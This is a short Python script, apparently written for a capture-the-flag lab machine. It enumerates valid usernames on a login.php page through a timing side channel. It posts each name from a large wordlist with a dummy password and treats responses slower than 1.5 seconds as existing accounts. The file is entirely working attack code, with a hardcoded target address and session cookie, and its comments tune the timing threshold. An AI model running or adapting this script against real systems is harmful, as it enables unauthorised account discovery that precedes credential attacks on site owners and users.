#!/usr/bin/python3
import requests
from pwn import log


def enumerate_users()->None:
    # Set data for the POST request
    url = "http://10.10.11.135:80/login.php?login=true"
    cookies = {"PHPSESSID": "2oca96jn39cnsc4g99t6ho139m"}
    p1 = log.progress('Obtaining users')
    users_found = []
    p2 = log.progress("Users found")
    # Get number of lines of the file containing potential users
    filename: str = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
    with open(filename, "r") as f:
        total_lines = sum(1 for _ in f)
    # Start enumerating users
    with open(filename, "r") as f:
        try:
            for i, username in enumerate(f, start=1):
                data = {"user": username.strip(), 
                        "password": "passfield"}
                p1.status(f"{username.strip()} ({i}/{total_lines})")
                r =  requests.post(url, cookies=cookies, data=data)
                # If the time of the response is bigger than 1.5 seconds, then the user exists
                # Note that this time can vary depending on VPN and latency, so it's not a fixed value
                # Use 'admin' user (a user we know that does exist) as your reference
                if r.elapsed.total_seconds() > 1.5:
                    users_found.append(username.strip())
                    p2.status(users_found)
        except KeyboardInterrupt:
            p1.success("Ctrl +C. Users scanned.")
            p2.success(users_found)
    p1.success('Done')


def main()->None:
    enumerate_users()


if __name__ == "__main__":
    main()
